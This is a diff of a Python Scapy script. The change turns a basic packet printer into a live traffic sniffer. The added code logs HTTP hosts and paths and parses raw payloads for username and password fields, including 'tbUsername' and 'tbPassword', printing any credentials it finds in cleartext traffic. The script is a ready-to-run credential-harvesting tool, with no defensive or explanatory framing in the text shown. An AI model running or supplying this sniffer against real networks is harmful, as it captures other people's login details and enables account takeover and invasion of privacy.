@@ -1,50 +1,65 @@
-# Import the sniff function from Scapy to capture network packets
 from scapy.all import sniff
-
-# Import IP, TCP, and UDP protocol layers
 from scapy.layers.inet import IP, TCP, UDP
+from scapy.packet import Raw
+from scapy.layers.http import HTTPRequest
 
 
-# Function to analyze each captured packet
 def analyze_packet(packet):
 
-    # Check if the packet contains an IP layer
     if packet.haslayer(IP):
 
-        # Extract Source IP Address
         src_ip = packet[IP].src
-
-        # Extract Destination IP Address
         dst_ip = packet[IP].dst
 
-        # Extract Protocol Number (6 = TCP, 17 = UDP)
-        protocol = packet[IP].proto
+        print("\n==============================")
+        print("Source IP:", src_ip)
+        print("Destination IP:", dst_ip)
 
-        # Print packet details
-        print("=================================")
-        print(f"Source IP      : {src_ip}")
-        print(f"Destination IP : {dst_ip}")
-        print(f"Protocol       : {protocol}")
-
-        # Check if packet uses TCP protocol
+        # TCP Traffic
         if packet.haslayer(TCP):
-            print("Protocol Type  : TCP")
+            print("Protocol: TCP")
+            print("Source Port:", packet[TCP].sport)
+            print("Destination Port:", packet[TCP].dport)
 
-        # Check if packet uses UDP protocol
+        # UDP Traffic
         elif packet.haslayer(UDP):
-            print("Protocol Type  : UDP")
+            print("Protocol: UDP")
+            print("Source Port:", packet[UDP].sport)
+            print("Destination Port:", packet[UDP].dport)
 
-        # Print the total packet size in bytes
-        print("Packet Length  :", len(packet))
-        print("=================================")
+        # HTTP Request Detection
+        if packet.haslayer(HTTPRequest):
+
+            host = packet[HTTPRequest].Host.decode(errors="ignore")
+            path = packet[HTTPRequest].Path.decode(errors="ignore")
+
+            print("HTTP Request Detected")
+            print("Website:", host)
+            print("Page:", path)
+
+        # Capture Username & Password
+        if packet.haslayer(Raw):
+
+            load = packet[Raw].load.decode(errors="ignore")
+
+            if "username=" in load or "password=" in load or "tbUsername=" in load:
+
+                data = load.split("&")
+
+                for item in data:
+
+                    if "username=" in item or "tbUsername=" in item:
+                        print("username:", item.split("=")[1])
+
+                    if "password=" in item or "tbPassword=" in item:
+                        print("password:", item.split("=")[1])
 
 
-# Display message when packet capture starts
-print("Starting Packet Capture...")
+print("Starting Network Traffic Capture...")
 
-# Start sniffing network packets
-# prn = function to process each packet
-# store=False = do not store packets in memory (saves RAM)
-sniff(prn=analyze_packet, store=True)
-
+sniff(
+    filter="tcp or udp",
+    prn=analyze_packet,
+    store=False
+)
 #ctrl+c to stop the packet capture
